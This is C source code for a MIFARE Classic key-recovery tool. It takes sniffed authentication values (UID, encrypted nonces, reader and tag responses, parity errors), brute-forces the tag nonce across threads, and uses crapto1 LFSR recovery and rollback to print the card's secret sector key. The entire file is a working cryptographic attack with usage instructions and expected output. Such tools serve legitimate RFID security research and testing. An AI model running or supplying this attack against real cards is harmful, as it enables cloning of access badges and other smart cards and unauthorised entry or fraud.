#define __STDC_FORMAT_MACROS
#define _USE_32BIT_TIME_T 1
#include <inttypes.h>
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <pthread.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include "crapto1/crapto1.h"
#include "protocol.h"
#include "iso14443crc.h"

#define odd_parity(i) (( (i) ^ (i)>>1 ^ (i)>>2 ^ (i)>>3 ^ (i)>>4 ^ (i)>>5 ^ (i)>>6 ^ (i)>>7 ^ 1) & 0x01)

// a global mutex to prevent interlaced printing from different threads
pthread_mutex_t print_lock;

//--------------------- define options here
uint32_t uid = 0;     // serial number
uint32_t nt_enc = 0;  // Encrypted tag nonce
uint32_t nr_enc = 0;  // encrypted reader challenge
uint32_t ar_enc = 0;  // encrypted reader response
uint32_t at_enc = 0;  // encrypted tag response
uint32_t cmd_enc = 0; // next encrypted command to sector

uint32_t nt_par_err = 0;
uint32_t ar_par_err = 0;
uint32_t at_par_err = 0;

typedef struct thread_args {
    uint16_t xored;
    int thread;
    int idx;
    bool ev1;
} targs;

//------------------------------------------------------------------
uint8_t cmds[] = {
    ISO14443A_CMD_READBLOCK,
    ISO14443A_CMD_WRITEBLOCK,
    MIFARE_AUTH_KEYA,
    MIFARE_AUTH_KEYB,
    MIFARE_CMD_INC,
    MIFARE_CMD_DEC,
    MIFARE_CMD_RESTORE,
    MIFARE_CMD_TRANSFER
};

int global_counter = 0;
int global_fin_flag = 0;
int global_found = 0;
int global_found_candidate = 0;
size_t thread_count = 4;

static uint16_t parity_from_err(uint32_t data, uint16_t par_err) {

    uint16_t par = 0;
    par |= odd_parity((data >> 24) & 0xFF) ^ ((par_err >> 12) & 1);
    par <<= 4;

    par |= odd_parity((data >> 16) & 0xFF) ^ ((par_err >> 8) & 1);
    par <<= 4;

    par |= odd_parity((data >> 8) & 0xFF) ^ ((par_err >> 4) & 1);
    par <<= 4;

    par |= odd_parity(data & 0xFF) ^ (par_err & 1);
    return par;
}

static uint16_t xored_bits(uint16_t nt_par, uint32_t ntenc, uint16_t ar_par, uint32_t arenc, uint16_t at_par, uint32_t atenc) {
    uint16_t xored = 0;

    uint8_t par;
    //1st (1st nt)
    par = (nt_par >> 12) & 1;
    xored |=  par ^ ((ntenc >> 16) & 1);
    xored <<= 1;

    //2nd (2nd nt)
    par = (nt_par >> 8) & 1;
    xored |= par ^ ((ntenc >> 8) & 1);
    xored <<= 1;

    //3rd (3rd nt)
    par = (nt_par >> 4) & 1;
    xored |= par ^ (ntenc & 1);
    xored <<= 1;

    //4th (1st ar)
    par = (ar_par >> 12) & 1;
    xored |= par ^ ((arenc >> 16) & 1);
    xored <<= 1;

    //5th (2nd ar)
    par = (ar_par >> 8) & 1;
    xored |= par ^ ((arenc >> 8) & 1);
    xored <<= 1;

    //6th (3rd ar)
    par = (ar_par >> 4) & 1;
    xored |= par ^ (arenc & 1);
    xored <<= 1;

    //7th (4th ar)
    par = ar_par & 1;
    xored |= par ^ ((atenc >> 24) & 1);
    xored <<= 1;

    //8th (1st at)
    par = (at_par >> 12) & 1;
    xored |= par ^ ((atenc >> 16) & 1);
    xored <<= 1;

    //9th (2nd at)
    par = (at_par >> 8) & 1;
    xored |= par ^ ((atenc >> 8) & 1);
    xored <<= 1;

    //10th (3rd at)
    par = (at_par >> 4) & 1;
    xored |= par ^ (atenc & 1);

    return xored;
}

static bool candidate_nonce(uint32_t xored, uint32_t nt, bool ev1) {
    uint8_t byte, check;

    if (!ev1) {
        //1st (1st nt)
        byte = (nt >> 24) & 0xFF;
        check = odd_parity(byte) ^ ((nt >> 16) & 1) ^ ((xored >> 9) & 1);
        if (check) return false;

        //2nd (2nd nt)
        byte = (nt >> 16) & 0xFF;
        check = odd_parity(byte) ^ ((nt >> 8) & 1) ^ ((xored >> 8) & 1);
        if (check) return false;
    }

    //3rd (3rd nt)
    byte = (nt >> 8) & 0xFF;
    check = odd_parity(byte) ^ (nt & 1) ^ ((xored >> 7) & 1);
    if (check) return false;

    uint32_t ar = prng_successor(nt, 64);

    //4th (1st ar)
    byte = (ar >> 24) & 0xFF;
    check = odd_parity(byte) ^ ((ar >> 16) & 1) ^ ((xored >> 6) & 1);
    if (check) return false;

    //5th (2nd ar)
    byte = (ar >> 16) & 0x0FF;
    check = odd_parity(byte) ^ ((ar >> 8) & 1) ^ ((xored >> 5) & 1);
    if (check) return false;

    //6th (3rd ar)
    byte = (ar >> 8) & 0xFF;
    check = odd_parity(byte) ^ (ar & 1) ^ ((xored >> 4) & 1);
    if (check) return false;

    uint32_t at = prng_successor(nt, 96);

    //7th (4th ar)
    byte = ar & 0xFF;
    check = odd_parity(byte) ^ ((at >> 24) & 1) ^ ((xored >> 3) & 1);
    if (check) return false;

    //8th (1st at)
    byte = (at >> 24) & 0xFF;
    check = odd_parity(byte) ^ ((at >> 16) & 1) ^ ((xored >> 2) & 1);
    if (check) return false;

    //9th (2nd at)
    byte = (at >> 16) & 0xFF;
    check = odd_parity(byte) ^ ((at >> 8) & 1) ^ ((xored >> 1) & 1) ;
    if (check) return false;

    //10th (3rd at)
    byte = (at >> 8) & 0xFF;
    check = odd_parity(byte) ^ (at & 1) ^ (xored & 1);
    if (check) return false;

    return true;
}

static bool checkValidCmd(uint32_t decrypted) {
    uint8_t cmd = (decrypted >> 24) & 0xFF;
    for (int i = 0; i < sizeof(cmds); ++i) {
        if (cmd == cmds[i])
            return true;
    }
    return false;
}

static bool checkCRC(uint32_t decrypted) {
    uint8_t data[] = {
        (decrypted >> 24) & 0xFF,
        (decrypted >> 16) & 0xFF,
        (decrypted >> 8)  & 0xFF,
        decrypted & 0xFF
    };
    return CheckCrc14443(CRC_14443_A, data, sizeof(data));
}

static void *brute_thread(void *arguments) {

    //int shift = (int)arg;
    struct thread_args *args = (struct thread_args *) arguments;

    struct Crypto1State *revstate;
    uint64_t key;     // recovered key candidate
    uint32_t ks2;     // keystream used to encrypt reader response
    uint32_t ks3;     // keystream used to encrypt tag response
    uint32_t ks4;     // keystream used to encrypt next command
    uint32_t nt;      // current tag nonce

    uint32_t p64 = 0;
    uint32_t count;
    int found = 0;
    // TC == 4  (
    // threads calls 0 ev1 == false
    // threads calls 0,1,2  ev1 == true
    for (count = args->idx; count < 0xFFFF; count += thread_count - 1) {

        found = global_found;
        if (found) break;

        nt = count << 16 | prng_successor(count, 16);

        if (!candidate_nonce(args->xored, nt, args->ev1))
            continue;

        p64 = prng_successor(nt, 64);
        ks2 = ar_enc ^ p64;
        ks3 = at_enc ^ prng_successor(p64, 32);
        revstate = lfsr_recovery64(ks2, ks3);
        ks4 = crypto1_word(revstate, 0, 0);

        if (ks4 != 0) {

            // lock this section to avoid interlacing prints from different threats
            pthread_mutex_lock(&print_lock);
            if (args->ev1)
                printf("\n**** Possible key candidate ****\n");

#if 0
            printf("thread #%d idx %d %s\n", args->thread, args->idx, (args->ev1) ? "(Ev1)" : "");
            printf("current nt(%08x)  ar_enc(%08x)  at_enc(%08x)\n", nt, ar_enc, at_enc);
            printf("ks2:%08x\n", ks2);
            printf("ks3:%08x\n", ks3);
            printf("ks4:%08x\n", ks4);
#endif
            if (cmd_enc) {
                uint32_t decrypted = ks4 ^ cmd_enc;
                printf("CMD enc(%08x)\n", cmd_enc);
                printf("    dec(%08x)\t", decrypted);

                uint8_t isOK = 0;
                // check if cmd exists
                isOK = checkValidCmd(decrypted);

                // Add a crc-check.
                isOK = checkCRC(decrypted);

                if (!isOK) {
                    printf("<-- not a valid cmd\n");
                    pthread_mutex_unlock(&print_lock);
                    continue;
                } else {
                    printf("<-- Valid cmd\n");
                }
            }

            lfsr_rollback_word(revstate, 0, 0);
            lfsr_rollback_word(revstate, 0, 0);
            lfsr_rollback_word(revstate, 0, 0);
            lfsr_rollback_word(revstate, nr_enc, 1);
            lfsr_rollback_word(revstate, uid ^ nt, 0);
            crypto1_get_lfsr(revstate, &key);
            free(revstate);

            if (args->ev1) {
                printf("\nKey candidate: [%012" PRIx64 "]\n\n", key);
                __sync_fetch_and_add(&global_found_candidate, 1);
            } else {
                printf("\nValid Key found: [%012" PRIx64 "]\n\n", key);
                __sync_fetch_and_add(&global_found, 1);
            }
            //release lock
            pthread_mutex_unlock(&print_lock);
        }
    }
    return NULL;
}

static int usage(void) {
    printf(" syntax: mf_nonce_brute <uid> <nt> <nt_par_err> <nr> <ar> <ar_par_err> <at> <at_par_err> [<next_command>]\n\n");
    printf(" example:   nt in trace = 8c! 42 e6! 4e!\n");
    printf("                     nt = 8c42e64e\n");
    printf("             nt_par_err = 1011\n\n");
    printf("\n expected outcome:\n");
    printf("  KEY 0xFFFFFFFFFFFF ==   fa247164 fb47c594 0000 71909d28 0c254817 1000 0dc7cfbd 1110\n");
    return 1;
}

int main(int argc, char *argv[]) {
    printf("Mifare classic nested auth key recovery. Phase 1.\n");

    if (argc < 9) return usage();

    sscanf(argv[1], "%x", &uid);
    sscanf(argv[2], "%x", &nt_enc);
    sscanf(argv[3], "%x", &nt_par_err);
    sscanf(argv[4], "%x", &nr_enc);
    sscanf(argv[5], "%x", &ar_enc);
    sscanf(argv[6], "%x", &ar_par_err);
    sscanf(argv[7], "%x", &at_enc);
    sscanf(argv[8], "%x", &at_par_err);

    if (argc > 9)
        sscanf(argv[9], "%x", &cmd_enc);

    printf("-------------------------------------------------\n");
    printf("uid:\t\t%08x\n", uid);
    printf("nt encrypted:\t%08x\n", nt_enc);
    printf("nt parity err:\t%04x\n", nt_par_err);
    printf("nr encrypted:\t%08x\n", nr_enc);
    printf("ar encrypted:\t%08x\n", ar_enc);
    printf("ar parity err:\t%04x\n", ar_par_err);
    printf("at encrypted:\t%08x\n", at_enc);
    printf("at parity err:\t%04x\n", at_par_err);

    if (argc > 9)
        printf("next cmd enc:\t%08x\n\n", cmd_enc);

    clock_t t1 = clock();
    uint16_t nt_par = parity_from_err(nt_enc, nt_par_err);
    uint16_t ar_par = parity_from_err(ar_enc, ar_par_err);
    uint16_t at_par = parity_from_err(at_enc, at_par_err);

    //calc (parity XOR corresponding nonce bit encoded with the same keystream bit)
    uint16_t xored = xored_bits(nt_par, nt_enc, ar_par, ar_enc, at_par, at_enc);

#ifndef __WIN32
    thread_count = sysconf(_SC_NPROCESSORS_CONF);
    if (thread_count < 2)
        thread_count = 2;
#endif  /* _WIN32 */

    printf("\nBruteforce using %zu threads to find encrypted tagnonce last bytes\n", thread_count);

    pthread_t threads[thread_count];

    // create a mutex to avoid interlacing print commands from our different threads
    pthread_mutex_init(&print_lock, NULL);

    // one thread T0 for none EV1.
    struct thread_args *a = malloc(sizeof(struct thread_args));
    a->xored = xored;
    a->thread = 0;
    a->idx = 0;
    a->ev1 = false;
    pthread_create(&threads[0], NULL, brute_thread, (void *)a);

    // the rest of available threads to EV1 scenario
    for (int i = 0; i < thread_count - 1; ++i) {
        struct thread_args *b = malloc(sizeof(struct thread_args));
        b->xored = xored;
        b->thread = i + 1;
        b->idx = i;
        b->ev1 = true;
        pthread_create(&threads[i + 1], NULL, brute_thread, (void *)b);
    }

    // wait for threads to terminate:
    for (int i = 0; i < thread_count; ++i)
        pthread_join(threads[i], NULL);

    if (!global_found && !global_found_candidate) {
        printf("\nFailed to find a key\n\n");
    }

    t1 = clock() - t1;
    if (t1 > 0)
        printf("Execution time: %.0f ticks\n", (float)t1);

    // clean up mutex
    pthread_mutex_destroy(&print_lock);
    return 0;
}
